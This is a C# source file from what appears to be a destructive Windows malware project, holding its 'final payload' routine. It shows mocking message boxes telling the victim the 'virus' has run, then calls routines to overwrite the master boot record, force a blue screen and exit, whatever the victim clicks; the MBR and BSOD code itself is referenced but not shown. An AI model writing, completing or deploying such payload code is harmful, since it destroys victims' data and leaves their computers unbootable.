using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace AlexRealm
{
    public class Final
    {
        public static void strongest_payload()
        {
            if (MessageBox.Show("I'm very sorry. You happened to execute this virus on my birthday, therefore you got the worst payload. Would you like to enjoy the final moments using your PC?", "Question", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                MessageBox.Show("Best of luck to you. You have 60 seconds before your MBR is overwritten and your computer is forcefully shut down.", "Question", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                Thread.Sleep(60000);


                MessageBox.Show("G̵͈͆O̵̞̫̪͍͔̤͍̣̻͓͋̀́͑͆̋̐̑̅̌̔̀͘̚͜͜͠O̸̙̟͊̔̉̆̊́͜D̶̛̛̺͙̺̄́̿͐͛̊̈̓̌̅͠ͅB̴̡̢̀͊̅͐͝͠Y̸̤̳̦̩̌͂̏͊͘Ḙ̴̡̡̳͎̯̲̮̤̐̓̿̀̈́͋̿̅̑̾̾ͅ", "Computer Destroyed", MessageBoxButtons.OK, MessageBoxIcon.Error);


                Thread.Sleep(5000);
                MBR.mbr_destroy();
                Thread.Sleep(1000);
                BSOD.bsod_start();
                Environment.Exit(-1);
            }
            else
            {
                MessageBox.Show("G̵͈͆O̵̞̫̪͍͔̤͍̣̻͓͋̀́͑͆̋̐̑̅̌̔̀͘̚͜͜͠O̸̙̟͊̔̉̆̊́͜D̶̛̛̺͙̺̄́̿͐͛̊̈̓̌̅͠ͅB̴̡̢̀͊̅͐͝͠Y̸̤̳̦̩̌͂̏͊͘Ḙ̴̡̡̳͎̯̲̮̤̐̓̿̀̈́͋̿̅̑̾̾ͅ", "Computer Destroyed", MessageBoxButtons.OK, MessageBoxIcon.Error);


                Thread.Sleep(5000);
                MBR.mbr_destroy();
                Thread.Sleep(1000);
                BSOD.bsod_start();
                Environment.Exit(-1);
            }
        }
    }
}